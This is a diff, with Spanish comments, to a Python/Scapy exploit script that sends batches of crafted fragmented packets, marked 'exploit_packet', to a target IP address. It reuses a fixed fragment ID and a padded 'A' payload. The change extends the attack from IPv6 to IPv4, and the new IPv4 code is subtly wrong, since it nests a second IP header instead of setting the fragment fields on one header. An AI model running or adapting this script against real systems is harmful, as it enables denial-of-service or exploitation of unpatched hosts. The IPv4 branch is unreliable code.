@@ -11,7 +11,7 @@ def parse_arguments():
     """
     Parsea los argumentos de línea de comandos.
     """
-    parser = argparse.ArgumentParser(description="Script para enviar paquetes IPv6 fragmentados.")
+    parser = argparse.ArgumentParser(description="Script para enviar paquetes IPv4/IPv6 fragmentados.")
     parser.add_argument('--iface', type=str, required=True, help='Interfaz de red a utilizar.')
     parser.add_argument('--ip_addr', type=str, required=True, help='Dirección IP de destino.')
     parser.add_argument('--num_tries', type=int, default=20, help='Número de intentos por lote.')
@@ -24,30 +24,38 @@ def parse_arguments():
 
 def validate_ip(ip_addr):
     """
-    Valida que la dirección IP proporcionada sea una dirección IPv6 válida.
+    Valida que la dirección IP proporcionada sea una dirección IPv4 o IPv6 válida.
     """
     try:
         socket.inet_pton(socket.AF_INET6, ip_addr)
         return True
     except socket.error:
-        return False
+        try:
+            socket.inet_pton(socket.AF_INET, ip_addr)
+            return True
+        except socket.error:
+            return False
 
 def create_exploit_packet(ip_addr, i):
     """
-    Crea un paquete IPv6 fragmentado para probar vulnerabilidades.
+    Crea un paquete IPv4 o IPv6 fragmentado para probar vulnerabilidades, dependiendo de la dirección IP proporcionada.
 
     :param ip_addr: Dirección IP de destino.
     :param i: Contador para generar un ID de fragmento único.
-    :return: Paquete IPv6 fragmentado.
+    :return: Paquete IPv4 o IPv6 fragmentado.
     """
     frag_id = 0xdebac1e + i
-    # Paquete potencialmente malicioso para probar la vulnerabilidad
-    exploit_packet = IPv6(dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / Raw(load='A'*1280)
+    
+    if ':' in ip_addr:  # Detección básica de IPv6
+        exploit_packet = IPv6(dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / Raw(load='A'*1280)
+    else:  # Asumimos IPv4
+        exploit_packet = IP(dst=ip_addr) / IP(id=frag_id, flags='MF') / Raw(load='A'*1280)
+    
     return exploit_packet
 
 def send_packets(iface, ip_addr, num_tries, num_batches, test_mode):
     """
-    Envía los paquetes IPv6 fragmentados en lotes.
+    Envía los paquetes IPv4/IPv6 fragmentados en lotes.
 
     :param iface: Interfaz de red a utilizar.
     :param ip_addr: Dirección IP de destino.
